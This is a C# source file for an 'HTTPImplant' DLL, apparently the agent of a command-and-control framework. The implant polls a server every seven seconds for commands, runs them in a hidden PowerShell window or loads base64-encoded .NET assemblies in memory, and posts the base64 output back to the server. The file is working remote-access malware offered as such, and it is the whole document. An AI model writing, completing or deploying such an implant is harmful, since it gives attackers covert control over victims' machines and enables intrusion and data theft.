using System;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using HTTPImplant.Modules;

namespace HTTPImplant
{
    public class ImplantDLL
    {
        public string host { get; set; }
        public string port { get; set; }
        private static string lastCommandExecuted = string.Empty;

        public static void StartImplant(string[] args)
        {
            string implantId = Environment.MachineName;
            var webClient = new WebClient();

            var checkForCommandTimer = new System.Timers.Timer(7000); // 7 seconds
            checkForCommandTimer.Elapsed += (sender, e) =>
            {
                webClient.DownloadStringAsync(new Uri("http://127.0.0.1:8081/fetchCommand"));
            };
            checkForCommandTimer.AutoReset = true;
            checkForCommandTimer.Enabled = true;

            webClient.DownloadStringCompleted += (sender, e) =>
            {
                if (e.Error == null)
                {
                    string jsonResponse = e.Result;

                    Command command = new Command();
                    // Parsing the JSON.
                    command.Input = jsonResponse.Split(new string[] { "\"Input\":\"", "\",\"ImplantUser" }, StringSplitOptions.None)[1];
                    command.ImplantUser = jsonResponse.Split(new string[] { "\"ImplantUser\":\"", "\",\"Operator" }, StringSplitOptions.None)[1];
                    command.Operator = jsonResponse.Split(new string[] { "\"Operator\":\"", "\",\"timeToExec" }, StringSplitOptions.None)[1];
                    command.TimeToExec = jsonResponse.Split(new string[] { "\"timeToExec\":\"", "\",\"delay" }, StringSplitOptions.None)[1];
                    command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"File" }, StringSplitOptions.None)[1];
                    command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"Command" }, StringSplitOptions.None)[1];
                    command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\"}" }, StringSplitOptions.None)[1];

                    // If the command received from the server is the same as the last executed command, ignore it
                    if (command.command == lastCommandExecuted)
                        return;

                    lastCommandExecuted = command.command;

                    // Decision based on Input
                    if (command.Input.Contains("os"))
                    {
                        ProcessStartInfo processStartInfo = new ProcessStartInfo
                        {
                            FileName = "powershell.exe",
                            Arguments = "-NoLogo -NonInteractive -NoProfile -Command " + command.command,
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };
                        Process process = new Process
                        {
                            StartInfo = processStartInfo
                        };
                        process.Start();

                        string output = process.StandardOutput.ReadToEnd();
                        process.WaitForExit();
                        string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
                        SendResult(webClient, implantId, command.Operator, outputBase64);
                    }
                    else if (command.Input.Contains("execute-assembly"))
                    {
                        byte[] bytes = Convert.FromBase64String(command.File);
                        string output = ExecuteAssembly.Execute(bytes);
                        string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
                        SendResult(webClient, implantId, command.Operator, outputBase64);
                    }
                }
            };

            // Start with the first command check
            webClient.DownloadStringAsync(new Uri("http://127.0.0.1:8081/fetchCommand"));

            // To keep the console running, so it doesn't close before the async tasks complete
            Console.ReadLine();
        }

        public static void SendResult(WebClient webClient, string implantId, string operatorId, string outputBase64)
        {
            string resultJson = "{" + "\"ImplantId\": \"" + implantId + "\"," + "\"OperatorId\": \"" + operatorId + "\"," + "\"Output\": \"" + outputBase64 + "\"," + "\"DateFromLast\": \"" + DateTime.UtcNow.ToString("O") + "\"" + "}";
            webClient.UploadStringCompleted += (sender2, e2) =>
            {
            };
            webClient.UploadStringAsync(new Uri("http://127.0.0.1:8081/fetchOutput"), "POST", resultJson);
        }
    }

    public class Command
    {
        public string Input { get; set; }
        public string ImplantUser { get; set; }
        public string Operator { get; set; }
        public string TimeToExec { get; set; }
        public string Delay { get; set; }
        public string File { get; set; }
        public string command { get; set; }
    }
}